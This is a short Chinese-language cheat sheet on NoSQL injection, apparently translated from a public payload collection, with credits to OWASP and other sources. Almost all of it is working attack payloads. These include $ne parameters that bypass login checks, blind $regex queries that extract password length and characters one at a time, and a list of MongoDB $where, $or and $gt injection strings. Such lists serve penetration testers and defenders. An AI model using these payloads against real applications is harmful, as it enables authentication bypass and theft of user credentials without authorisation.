# 非关系型数据库
非关系型数据库相比传统的数据库提供更宽松的一致性限制。通过减少关系约束和一致性检查,非关系型数据库通常提供性能和扩展优势。然而,即使它们不使用传统的数据库语法，这些数据库仍然可能容易受到注入攻击。

## 攻击
 
使用不相等的基本身份验证旁路 ($ne)
```
username[$ne]=toto&password[$ne]=toto
```
 
提取长度信息
```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

提取数据信息
```
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*
```

## MongoDB有效载荷
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```


## 感谢
* https://www.dailysecurity.fr/nosql-injections-classique-blind/
* https://www.owasp.org/index.php/Testing_for_NoSQL_injection
* https://github.com/cr0hn/nosqlinjection_wordlists
